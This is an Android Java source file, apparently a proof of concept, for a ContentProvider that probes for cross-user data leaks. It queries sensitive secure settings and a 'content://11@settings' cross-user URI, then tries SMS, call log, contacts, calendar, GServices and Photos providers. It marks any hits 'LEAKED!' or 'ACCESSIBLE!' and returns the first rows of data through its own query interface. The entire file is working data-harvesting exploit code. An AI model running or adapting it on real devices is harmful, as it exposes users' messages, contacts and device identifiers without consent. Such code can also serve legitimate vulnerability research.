package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.content.ContentResolver;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Binder;
import android.os.Parcel;
import android.provider.Settings;
import java.lang.reflect.Method;

public class SettingsCrossUserProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        String path = uri.getPath();
        if (path != null && path.contains("settings")) {
            probeSettingsCrossUser(cursor);
        } else if (path != null && path.contains("slice")) {
            probeSliceProviders(cursor);
        } else if (path != null && path.contains("providers")) {
            probeExposedProviders(cursor);
        } else {
            probeSettingsCrossUser(cursor);
            probeSliceProviders(cursor);
            probeExposedProviders(cursor);
        }

        return cursor;
    }

    private void probeSettingsCrossUser(MatrixCursor cursor) {
        ContentResolver cr = getContext().getContentResolver();

        // Try to access Settings for user 11 via content:// URI manipulation
        // Normal: content://settings/secure/android_id
        // Cross-user attempt: content://11@settings/secure/android_id
        // Or: content://settings/secure/android_id?user=11

        // Method 1: Use userId in URI authority
        String[] sensitiveKeys = {"android_id", "bluetooth_address", "bluetooth_name",
            "lock_screen_owner_info", "enabled_accessibility_services",
            "default_input_method", "enabled_input_methods"};

        for (String key : sensitiveKeys) {
            // Own user first
            try {
                Uri u = Uri.parse("content://settings/secure/" + key);
                Cursor c = cr.query(u, null, null, null, null);
                if (c != null && c.moveToFirst()) {
                    String val = c.getString(c.getColumnIndex("value"));
                    cursor.addRow(new Object[]{"sec_" + key, val != null ? truncate(val) : "null"});
                    c.close();
                } else {
                    cursor.addRow(new Object[]{"sec_" + key, "EMPTY"});
                    if (c != null) c.close();
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"sec_" + key, "ERR:" + truncate(e.getMessage())});
            }
        }

        // Try cross-user URI patterns
        for (int userId : new int[]{11}) {
            // Pattern: content://settings/secure/android_id with user= parameter
            try {
                Uri u = Uri.parse("content://" + userId + "@settings/secure/android_id");
                Cursor c = cr.query(u, null, null, null, null);
                if (c != null && c.moveToFirst()) {
                    String val = c.getString(c.getColumnIndex("value"));
                    cursor.addRow(new Object[]{"crossuser_" + userId + "_androidid",
                        "LEAKED! " + truncate(val)});
                    c.close();
                } else {
                    cursor.addRow(new Object[]{"crossuser_" + userId + "_androidid", "EMPTY/null"});
                    if (c != null) c.close();
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"crossuser_" + userId + "_androidid", "ERR:" + truncate(e.getMessage())});
            }

            // Try with ContentResolver.call()
            try {
                Uri u = Uri.parse("content://settings/secure");
                android.os.Bundle result = cr.call(u, "GET_secure", "android_id",
                    android.os.Bundle.EMPTY);
                if (result != null) {
                    String val = result.getString("value");
                    cursor.addRow(new Object[]{"call_androidid", val != null ? val : "null"});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"call_androidid", "ERR:" + truncate(e.getMessage())});
            }
        }

        // Also read global settings that might be interesting
        String[] globalKeys = {"device_name", "wifi_on", "airplane_mode_on",
            "mobile_data", "data_roaming", "nfc_payment_default_component"};
        for (String key : globalKeys) {
            try {
                Uri u = Uri.parse("content://settings/global/" + key);
                Cursor c = cr.query(u, null, null, null, null);
                if (c != null && c.moveToFirst()) {
                    String val = c.getString(c.getColumnIndex("value"));
                    cursor.addRow(new Object[]{"global_" + key, val != null ? truncate(val) : "null"});
                    c.close();
                } else {
                    if (c != null) c.close();
                }
            } catch (Exception e) {}
        }
    }

    private void probeSliceProviders(MatrixCursor cursor) {
        ContentResolver cr = getContext().getContentResolver();

        // SliceProviders that might expose sensitive data
        String[] sliceUris = {
            "content://com.android.settings.slices/action/wifi",
            "content://com.android.settings.slices/action/bluetooth",
            "content://com.android.settings.slices/action/flashlight",
            "content://com.android.settings.slices/action/airplane",
            "content://com.android.settings.slices/action/battery_saver",
            "content://android.settings.slices/slice/wifi",
            "content://com.google.android.gms.nearby.exposurenotification/",
        };

        for (String sliceUri : sliceUris) {
            try {
                Uri u = Uri.parse(sliceUri);
                Cursor c = cr.query(u, null, null, null, null);
                if (c != null) {
                    cursor.addRow(new Object[]{"slice_" + u.getLastPathSegment(),
                        "ACCESSIBLE! rows=" + c.getCount() + " cols=" + c.getColumnCount()});
                    if (c.moveToFirst()) {
                        StringBuilder sb = new StringBuilder();
                        for (int i = 0; i < Math.min(c.getColumnCount(), 5); i++) {
                            sb.append(c.getColumnName(i)).append("=");
                            try { sb.append(c.getString(i)); } catch (Exception ignored) { sb.append("?"); }
                            sb.append("|");
                        }
                        cursor.addRow(new Object[]{"slice_data", truncate(sb.toString())});
                    }
                    c.close();
                } else {
                    cursor.addRow(new Object[]{"slice_" + u.getLastPathSegment(), "null"});
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"slice_" + Uri.parse(sliceUri).getLastPathSegment(),
                    "ERR:" + truncate(e.getMessage())});
            }
        }
    }

    private void probeExposedProviders(MatrixCursor cursor) {
        ContentResolver cr = getContext().getContentResolver();

        // Try accessing known high-value ContentProviders
        String[] uris = {
            "content://com.google.android.gms.phenotype/",
            "content://com.google.android.gsf.gservices/",
            "content://com.google.settings/partner",
            "content://com.android.providers.contacts/contacts",
            "content://com.android.providers.contacts/raw_contacts",
            "content://call_log/calls",
            "content://sms",
            "content://mms-sms/conversations",
            "content://com.android.calendar/events",
            "content://com.android.providers.downloads/all_downloads",
            "content://com.google.android.apps.photos.contentprovider/",
            "content://com.android.providers.media.documents/root",
        };

        for (String uriStr : uris) {
            try {
                Uri u = Uri.parse(uriStr);
                Cursor c = cr.query(u, null, null, null, null);
                if (c != null) {
                    int rows = c.getCount();
                    if (rows > 0) {
                        cursor.addRow(new Object[]{"cp_" + u.getAuthority().replace("com.", "").replace("android.", ""),
                            "ACCESSIBLE! rows=" + rows});
                        // Read first row
                        if (c.moveToFirst()) {
                            StringBuilder sb = new StringBuilder();
                            for (int i = 0; i < Math.min(c.getColumnCount(), 5); i++) {
                                sb.append(c.getColumnName(i)).append("=");
                                try { sb.append(c.getString(i)); } catch (Exception ignored) { sb.append("?"); }
                                sb.append("|");
                            }
                            cursor.addRow(new Object[]{"cp_data", truncate(sb.toString())});
                        }
                    } else {
                        cursor.addRow(new Object[]{"cp_" + u.getAuthority().replace("com.", "").replace("android.", ""),
                            "accessible_empty"});
                    }
                    c.close();
                }
            } catch (SecurityException e) {
                // Expected - permission denied
            } catch (Exception e) {
                String msg = e.getMessage();
                if (msg != null && !msg.contains("Permission") && !msg.contains("denied") &&
                    !msg.contains("requires") && msg.length() > 3) {
                    cursor.addRow(new Object[]{"cp_" + Uri.parse(uriStr).getAuthority().replace("com.", "").replace("android.", ""),
                        truncate(msg)});
                }
            }
        }

        // Try GServices (valuable config oracle)
        try {
            Uri u = Uri.parse("content://com.google.android.gsf.gservices");
            Cursor c = cr.query(u, null, null, new String[]{"android_id"}, null);
            if (c != null && c.moveToFirst()) {
                cursor.addRow(new Object[]{"gsf_androidid", "GOT: " + c.getString(1)});
                c.close();
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"gsf_androidid", "ERR:" + truncate(e.getMessage())});
        }

        // Try Phenotype (GMS feature flags)
        try {
            Uri u = Uri.parse("content://com.google.android.gms.phenotype/com.google.android.gms");
            Cursor c = cr.query(u, null, null, null, null);
            if (c != null) {
                cursor.addRow(new Object[]{"phenotype", "ACCESSIBLE! rows=" + c.getCount()});
                c.close();
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"phenotype", "ERR:" + truncate(e.getMessage())});
        }
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
